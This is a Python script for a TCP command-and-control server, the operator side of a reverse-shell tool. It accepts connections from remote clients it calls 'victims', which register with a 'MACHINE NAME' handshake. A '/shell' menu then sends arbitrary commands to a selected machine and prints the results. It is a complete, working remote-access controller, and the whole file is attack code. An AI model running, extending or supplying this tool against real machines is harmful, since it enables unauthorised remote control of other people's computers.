import socket
from threading import Thread
from datetime import datetime


class Server:
    def __init__(self, ip: str, port: int):
        self.client_sockets = {}  # List format is like = {'Machine_name': [IP, [SOCKET], {'status': 'open' or 'closed'}]}
        self.list_local_logs = []  # List the local logs
        self.connected_socket = None  # The connected socket
        self.connected_socket_name = str  # The machine name of connected socket
        self.buffer = 1024  # Buffersize of socket
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # TCP/IP socket
        self.server_socket.bind((ip, port))  # TCP/IP server
        print('Server started at {}:{}'.format(ip, port))
        Thread(target=self.recive_clients).start()  # Started the recive thread
        self.commands()

    def recvall(self, connected_socket):  # Function to recive all msg
        data = bytearray()  # The data send on socket is in byte format
        while True:  # Basicaly, recive packet until the packet is less than buffer, what indicate that is the last packet, and the break returning the bytearray of complete data
            packet = connected_socket.recv(self.buffer)
            data += packet
            if len(packet) < self.buffer:
                break
        return data

    def write_logs(self, log):  # Method to save local_logs and universal logs
        open('logs.txt', 'a').write(log + '\n')
        self.list_local_logs.append(log)

    def select_socket(self):  # Method to select_sockets
        if len(self.client_sockets) < 1:  # If there's no socket avaible
            print("There's no socket avaible!")
            print('Returning to menu...')
            self.commands()
        else:
            for dict_itens in self.client_sockets:  # Print all sockets with her status
                print(f'{dict_itens.capitalize()} | Status : {self.client_sockets[dict_itens][2]["status"].capitalize()}')
            print('Do you wanna connect? [Y/N]: ')
            connect_question = str(input(': ')).upper().strip()
            while connect_question != 'Y' and connect_question != 'N':  # To avoid some error on choice
                connect_question = str(input(': ')).upper().strip()
            if connect_question == 'Y':
                try:
                    selected_option = str(input('Select socket by name: ')).strip()  # Option to select socket by name
                    while selected_option not in self.client_sockets:
                        selected_option = str(input('Select socket by name: ')).strip()
                    if self.client_sockets[selected_option][2]['status'] == 'open':
                        self.connected_socket = self.client_sockets[selected_option][1][0]
                        self.connected_socket_name = selected_option
                    else:
                        print(f'The socket "{selected_option}" is closed!')
                        self.commands()
                except ValueError:
                    print('Returning to menu...')
                    self.commands()
            else:
                print('Returning to menu...')
                self.commands()

    def commands(self):  # The possible commands
        try:
            while True:
                command = input('> ')
                if command == '/select':
                    self.select_socket()
                elif command == '/socket':
                    print(self.connected_socket_name, ': ' + str(self.connected_socket))
                elif command == '/shell':
                    if self.connected_socket != None:
                        print('Opening shell...')
                        while True:
                            shell_command = str(input('> ')).lstrip()
                            if shell_command == 'exit':
                                print('Returning to menu...')
                                self.commands()
                            elif shell_command == '':
                                shell_command = str(input('> ')).lstrip()
                            else:
                                self.connected_socket.send(shell_command.encode())
                                print(self.recvall(self.connected_socket).decode('utf-8', 'ignore'))
                    else:
                        print("There's no socket connected!")
                        print('Returning to menu...')
                        self.commands()
                elif command == '/help':
                    print('''
/help   : show the possible commands
/select : show the options of sockets
/socket : show the connected socket
/shell  : start the shell input into selected socket | OBS.: type 'exit' to back to menu
''')

        except ConnectionResetError:  # Reset the connected_socket, change the status of actual connected socket and change the connected_socket_name to ''
            self.connected_socket = None
            self.client_sockets[self.connected_socket_name][2] = {'status': 'closed'}
            self.write_logs(log=f'The socket {self.connected_socket_name} has disconnected! - {datetime.now().strftime("%B %d %Y %H:%M")}')
            self.connected_socket_name = str
            print('The client has disconnected!')
            print('Returning to menu...')
            self.commands()

    def recive_clients(self):  # Method to recive clients
        while True:
            self.server_socket.listen(1)  # Server started to listen requests
            victm_socket, victm_ip = self.server_socket.accept()  # Server accept request
            local_machine_name = victm_socket.recv(self.buffer).decode('utf-8', 'ignore')  # Decode the first victm request, that's the machine name
            format_local_machine_name = list(local_machine_name.split(','))  # Format the recv into a list
            if format_local_machine_name[0] != 'MACHINE NAME':  # If the first element of list is different of 'MACHINE NAME', the socket is not add
                pass
            else:
                local_machine_name_plus_ip = format_local_machine_name[1] + '@' + str(victm_ip[0])  # For generate an unique possible socket per conection
                if local_machine_name_plus_ip not in self.client_sockets:  # If the machine is not on the client socket dict
                    self.client_sockets[local_machine_name_plus_ip] = [victm_ip[0], [victm_socket], {'status': 'open'}]  # Add in dict
                    self.write_logs(log=f'An new socket has been add, {format_local_machine_name[1]}, '
                                        f'with ip {victm_ip[0]} - {datetime.now().strftime("%B %d %Y %H:%M")}')

                else:
                    self.client_sockets[local_machine_name_plus_ip][1] = [victm_socket]  # Add the new socket
                    self.client_sockets[local_machine_name_plus_ip][2] = {'status': 'open'}  # Change the machine status to 'open'
                    self.write_logs(log=f'The machine "{format_local_machine_name[1]}" is now open! - '
                                        f'{datetime.now().strftime("%B %d %Y %H:%M")}')


def main(ip, port):
    if ip == '':
        ip = '127.0.0.1'
    try:
        server = Server(ip, port)
    except socket.gaierror:
        print('IP ADRESS NOT VALID!')


if __name__ == '__main__':
    try:
        ip = input('Type your ip adress: ').lstrip()
        port = int(input('Type your port: '))
        main(ip, port)
    except ValueError:
        port = 999
        main(ip, port)
